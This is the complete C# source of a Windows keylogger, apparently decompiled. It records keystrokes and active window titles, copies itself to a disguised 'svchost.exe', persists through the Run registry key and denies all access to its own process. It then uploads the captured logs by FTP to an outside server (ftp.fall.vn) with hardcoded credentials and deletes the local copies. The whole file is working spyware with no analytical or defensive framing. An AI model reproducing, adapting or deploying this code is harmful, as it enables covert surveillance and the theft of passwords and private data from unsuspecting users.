using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

internal class Program
{
	[Flags]
	private enum ProcessAccessRights
	{
		PROCESS_CREATE_PROCESS = 0x80,
		PROCESS_CREATE_THREAD = 2,
		PROCESS_DUP_HANDLE = 0x40,
		PROCESS_QUERY_INFORMATION = 0x400,
		PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
		PROCESS_SET_INFORMATION = 0x200,
		PROCESS_SET_QUOTA = 0x100,
		PROCESS_SUSPEND_RESUME = 0x800,
		PROCESS_TERMINATE = 1,
		PROCESS_VM_OPERATION = 8,
		PROCESS_VM_READ = 0x10,
		PROCESS_VM_WRITE = 0x20,
		DELETE = 0x10000,
		READ_CONTROL = 0x20000,
		SYNCHRONIZE = 0x100000,
		WRITE_DAC = 0x40000,
		WRITE_OWNER = 0x80000,
		STANDARD_RIGHTS_REQUIRED = 0xF0000,
		PROCESS_ALL_ACCESS = 0x1F0FFF
	}

	private static IntPtr hwnd;

	private static IntPtr lastHwnd;

	private static StringBuilder stringTitle = new StringBuilder(256);

	private static StringBuilder processName = new StringBuilder(1000);

	private static string title;

	private static string process;

	private static uint lpdwProcessId;

	private static IntPtr hProcess;

	private static string stringKeyLog;

	private static int i;

	private static int x;

	private static int x2;

	private static string mydocpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Log\\";

	private static string destinationPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\svchost.exe";

	private static bool isclosing = false;

	private static int time = 0;

	private static Mutex mutex;

	private static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);

	private static readonly string[] VietnameseSigns = new string[12]
	{
		"aAeEoOuUiIdDyY", "áàạảãâấầậẩẫăắằặẳẵ", "ÁÀẠẢÃÂẤẦẬẨẪĂẮẰẶẲẴ", "éèẹẻẽêếềệểễ", "ÉÈẸẺẼÊẾỀỆỂỄ", "óòọỏõôốồộổỗơớờợởỡ", "ÓÒỌỎÕÔỐỒỘỔỖƠỚỜỢỞỠ", "úùụủũưứừựửữ", "ÚÙỤỦŨƯỨỪỰỬỮ", "íìịỉĩ",
		"ýỳỵỷỹ", "ÝỲỴỶỸ"
	};

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		byte[] pSecurityDescriptor = new byte[0];
		GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
		if ((long)lpnLengthNeeded > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
		{
			return null;
		}
		return new RawSecurityDescriptor(pSecurityDescriptor, 0);
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength];
		dacl.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(processHandle, 4, array);
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	private static extern short GetAsyncKeyState(int vkey);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr hWnd, [Out] StringBuilder lpString, int nMaxCount);

	[DllImport("user32.dll")]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

	[DllImport("kernel32.dll")]
	private static extern bool CloseHandle(IntPtr handle);

	[DllImport("psapi.dll")]
	private static extern uint GetProcessImageFileName(IntPtr hProcess, [Out] StringBuilder lpImageFileName, [In][MarshalAs(UnmanagedType.U4)] int nSize);

	private static string xoadau(string str)
	{
		for (int i = 1; i < VietnameseSigns.Length; i++)
		{
			for (int j = 0; j < VietnameseSigns[i].Length; j++)
			{
				str = str.Replace(VietnameseSigns[i][j], VietnameseSigns[0][i - 1]);
			}
		}
		return str;
	}

	private static void Main(string[] args)
	{
		try
		{
			checkInstance();
			copytoDestination();
			makeFileLog();
			while (!isclosing)
			{
				protect();
				time++;
				lastHwnd = GetForegroundWindow();
				if (hwnd != lastHwnd)
				{
					hwnd = GetForegroundWindow();
					GetWindowText(lastHwnd, stringTitle, stringTitle.Capacity);
					title = stringTitle.ToString().Trim(new char[1] { ' ' });
					GetWindowThreadProcessId(lastHwnd, out lpdwProcessId);
					hProcess = OpenProcess(1040u, bInheritHandle: false, lpdwProcessId);
					GetProcessImageFileName(hProcess, processName, processName.Capacity);
					CloseHandle(hProcess);
					process = processName.ToString();
					if (title != "")
					{
						string text = stringKeyLog;
						stringKeyLog = text + Environment.NewLine + "[ " + DateTime.Now.ToString("HH:mm:ss") + " ] [ " + xoadau(title);
						string text2 = stringKeyLog;
						stringKeyLog = text2 + " ] [ " + xoadau(process) + " ]" + Environment.NewLine;
					}
				}
				keyLog();
				Thread.Sleep(10);
				if (time == 1000)
				{
					writeLog(stringKeyLog);
					stringKeyLog = "";
					time = 0;
					rkApp.SetValue("Microsoft", destinationPath);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private static void checkInstance()
	{
		try
		{
			mutex = Mutex.OpenExisting("SINGLEINSTANCE");
			if (mutex != null)
			{
				Environment.Exit(0);
			}
		}
		catch (WaitHandleCannotBeOpenedException)
		{
			mutex = new Mutex(initiallyOwned: true, "SINGLEINSTANCE");
		}
	}

	private static void copytoDestination()
	{
		try
		{
			if (Environment.GetCommandLineArgs()[0].ToLower() != destinationPath.ToLower() && !File.Exists(destinationPath))
			{
				File.Copy(Environment.GetCommandLineArgs()[0], destinationPath);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = destinationPath;
				Process.Start(processStartInfo);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void makeFileLog()
	{
		try
		{
			if (!Directory.Exists(mydocpath))
			{
				Directory.CreateDirectory(mydocpath);
			}
			uploadFTP();
			DateTime now = DateTime.Now;
			mydocpath = mydocpath + Environment.MachineName.ToString() + "_" + now.ToString("dd-MM-yy");
			string text = mydocpath;
			mydocpath = text + "_" + now.ToString("hh") + "-" + now.ToString("mm") + "-" + now.ToString("ss") + ".log";
			writeLog("Start log at: " + now, isline: true);
		}
		catch (Exception)
		{
		}
	}

	private static void keyLog()
	{
		for (i = 65; i <= 90; i++)
		{
			x = GetAsyncKeyState(i);
			x2 = GetAsyncKeyState(16);
			if (x == -32767)
			{
				if (x2 == -32768)
				{
					stringKeyLog += Convert.ToChar(i);
				}
				else
				{
					stringKeyLog += Convert.ToChar(i + 32);
				}
			}
		}
		for (i = 8; i <= 222; i++)
		{
			if (i == 65)
			{
				i = 91;
			}
			x = GetAsyncKeyState(i);
			x2 = GetAsyncKeyState(16);
			if (x == -32767)
			{
				switch (i)
				{
				case 219:
					stringKeyLog += ((x2 == -32768) ? "{" : "[");
					break;
				case 220:
					stringKeyLog += ((x2 == -32768) ? "|" : Convert.ToChar(92).ToString());
					break;
				case 221:
					stringKeyLog += ((x2 == -32768) ? "}" : "]");
					break;
				case 222:
					stringKeyLog += ((x2 == -32768) ? Convert.ToChar(34).ToString() : Convert.ToChar(44).ToString());
					break;
				case 186:
					stringKeyLog += ((x2 == -32768) ? ":" : ";");
					break;
				case 187:
					stringKeyLog += ((x2 == -32768) ? "+" : "=");
					break;
				case 188:
					stringKeyLog += ((x2 == -32768) ? "<" : ",");
					break;
				case 189:
					stringKeyLog += ((x2 == -32768) ? "_" : "-");
					break;
				case 190:
					stringKeyLog += ((x2 == -32768) ? ">" : ".");
					break;
				case 191:
					stringKeyLog += ((x2 == -32768) ? "?" : "/");
					break;
				case 192:
					stringKeyLog += ((x2 == -32768) ? "~" : "`");
					break;
				case 8:
					stringKeyLog += " [BS] ";
					break;
				case 9:
					stringKeyLog += " [Tab] ";
					break;
				case 13:
					stringKeyLog += " [Enter] ";
					break;
				case 17:
					stringKeyLog += " [Ctrl]";
					break;
				case 18:
					stringKeyLog += " [Alt] ";
					break;
				case 19:
					stringKeyLog += " [Pause] ";
					break;
				case 20:
					stringKeyLog += " [Capslock] ";
					break;
				case 27:
					stringKeyLog += " [Esc] ";
					break;
				case 32:
					stringKeyLog += " ";
					break;
				case 33:
					stringKeyLog += " [PgUp] ";
					break;
				case 34:
					stringKeyLog += " [PgDn] ";
					break;
				case 35:
					stringKeyLog += " [End] ";
					break;
				case 36:
					stringKeyLog += " [Home] ";
					break;
				case 37:
					stringKeyLog += " [Left] ";
					break;
				case 38:
					stringKeyLog += " [Up] ";
					break;
				case 39:
					stringKeyLog += " [Right] ";
					break;
				case 40:
					stringKeyLog += " [Down] ";
					break;
				case 41:
					stringKeyLog += " [Select] ";
					break;
				case 44:
					stringKeyLog += " [Screen] ";
					break;
				case 45:
					stringKeyLog += " [Insert] ";
					break;
				case 46:
					stringKeyLog += " [Del] ";
					break;
				case 47:
					stringKeyLog += " [Help] ";
					break;
				case 48:
					stringKeyLog += ((x2 == -32768) ? ")" : "0");
					break;
				case 49:
					stringKeyLog += ((x2 == -32768) ? "!" : "1");
					break;
				case 50:
					stringKeyLog += ((x2 == -32768) ? "@" : "2");
					break;
				case 51:
					stringKeyLog += ((x2 == -32768) ? "#" : "3");
					break;
				case 52:
					stringKeyLog += ((x2 == -32768) ? "$" : "4");
					break;
				case 53:
					stringKeyLog += ((x2 == -32768) ? "%" : "5");
					break;
				case 54:
					stringKeyLog += ((x2 == -32768) ? "^" : "6");
					break;
				case 55:
					stringKeyLog += ((x2 == -32768) ? "&" : "7");
					break;
				case 56:
					stringKeyLog += ((x2 == -32768) ? "(" : "8");
					break;
				case 57:
					stringKeyLog += ((x2 == -32768) ? ")" : "9");
					break;
				case 91:
					stringKeyLog += " [WIN] ";
					break;
				case 92:
					stringKeyLog += " [WIN] ";
					break;
				case 96:
					stringKeyLog += "0";
					break;
				case 97:
					stringKeyLog += "1";
					break;
				case 98:
					stringKeyLog += "2";
					break;
				case 99:
					stringKeyLog += "3";
					break;
				case 100:
					stringKeyLog += "4";
					break;
				case 101:
					stringKeyLog += "5";
					break;
				case 102:
					stringKeyLog += "6";
					break;
				case 103:
					stringKeyLog += "7";
					break;
				case 104:
					stringKeyLog += "8";
					break;
				case 105:
					stringKeyLog += "9";
					break;
				case 106:
					stringKeyLog += "*";
					break;
				case 107:
					stringKeyLog += "+";
					break;
				case 109:
					stringKeyLog += "-";
					break;
				case 110:
					stringKeyLog += ".";
					break;
				case 111:
					stringKeyLog += "/";
					break;
				case 112:
					stringKeyLog += "F1";
					break;
				case 113:
					stringKeyLog += "F2";
					break;
				case 114:
					stringKeyLog += "F3";
					break;
				case 115:
					stringKeyLog += "F4";
					break;
				case 116:
					stringKeyLog += "F5";
					break;
				case 117:
					stringKeyLog += "F6";
					break;
				case 118:
					stringKeyLog += "F7";
					break;
				case 119:
					stringKeyLog += "F8";
					break;
				case 120:
					stringKeyLog += "F9";
					break;
				case 121:
					stringKeyLog += "F10";
					break;
				case 122:
					stringKeyLog += "F11";
					break;
				case 123:
					stringKeyLog += "F12";
					break;
				}
			}
		}
	}

	private static void writeLog(string stringKl, bool isline = false)
	{
		try
		{
			TextWriter textWriter = new StreamWriter(mydocpath, append: true);
			if (isline)
			{
				textWriter.WriteLine(stringKl);
			}
			else
			{
				textWriter.Write(stringKl);
			}
			textWriter.Close();
		}
		catch (Exception)
		{
		}
	}

	private static void uploadFTP()
	{
		if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Log"))
		{
			return;
		}
		string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Log", "*.log");
		string[] array = files;
		foreach (string path in array)
		{
			bool flag = false;
			try
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://ftp.fall.vn//htdocs//Log//" + Path.GetFileName(path));
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential("fall_10606112", "2508440");
				StreamReader streamReader = new StreamReader(path);
				byte[] bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
				streamReader.Close();
				ftpWebRequest.ContentLength = bytes.Length;
				Stream requestStream = ftpWebRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				_ = (FtpWebResponse)ftpWebRequest.GetResponse();
			}
			catch (Exception)
			{
				flag = true;
			}
			if (!flag)
			{
				File.Delete(path);
			}
		}
	}

	private static void protect()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
		processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
	}
}
